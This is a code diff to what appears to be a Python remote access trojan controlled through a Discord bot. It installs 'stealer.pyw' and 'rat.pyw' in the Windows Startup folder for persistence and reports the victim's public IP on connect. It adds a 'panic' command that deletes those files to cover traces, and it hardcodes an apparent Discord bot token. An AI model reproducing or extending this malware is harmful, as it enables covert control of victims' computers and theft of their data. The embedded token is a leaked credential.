@@ -50,15 +50,10 @@ help_text = {
     )
 }
 
-def load_config():
-    with open('config.json', 'r') as f:
-        return json.load(f)
-
+prefix = "!"
 stop = False
-config = load_config()
-token = config['token']
-prefix = config['prefix']
 USER_NAME = getpass.getuser()
+token = "MTMxNTQ1OTQ5MjI0NjE5NjI1NA.GxSf77.CUHcny6L1tU_KtuBEVD7uX8E_DUHzkuCjU9ZjA"
 
 stealer_path = f"C:\\Users\\{USER_NAME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\stealer.pyw"
 rat_path = f"C:\\Users\\{USER_NAME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\rat.pyw"
@@ -71,13 +66,10 @@ client.remove_command("help")
 
 current_directories = {}
 
-def stopAccess():
-    stop = True
-
 @client.event
 async def on_ready():
     os.system("cls")
-    print(f"Connected to {requests.get('https://api.ipify.org').text.strip()}!")
+    print(f"Connected to {requests.get('https://api.ipify.org').text.strip()}.")
     await setup_channel()
 
 async def setup_channel():
@@ -109,8 +101,32 @@ async def current_dir(ctx):
 @commands.cooldown(1, 5, commands.BucketType.category)
 async def stop_access(ctx):
     await ctx.send(f'Stopping access.')
-    stopAccess()
+    stop = True
     await ctx.send(f'Stopped access.')
+
+@client.command()
+@commands.cooldown(1, 5, commands.BucketType.category)
+async def panic(ctx):
+    await ctx.send("Panic mode activated! Stopping access...")
+    
+    global stop
+    stop = True
+    
+    await ctx.send("The system will close, and the files will be deleted in the background after a 10 seconds countdown.")
+    
+    startup_directory = f"C:\\Users\\{USER_NAME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
+    files_to_delete = [
+        'rat.pyw',
+        'stealer.pyw',
+        'rat.lnk',
+        'stealer.lnk'
+    ]
+    
+    Popen(['cmd.exe', '/c', f'del {startup_directory}\\{files_to_delete[0]} && del {startup_directory}\\{files_to_delete[1]} && del {startup_directory}\\{files_to_delete[2]} && del {startup_directory}\\{files_to_delete[3]}'], shell=True)
+    
+    await ctx.send("System closed.")
+    exit()
+
 
 @client.command()
 @commands.cooldown(1, 5, commands.BucketType.category)
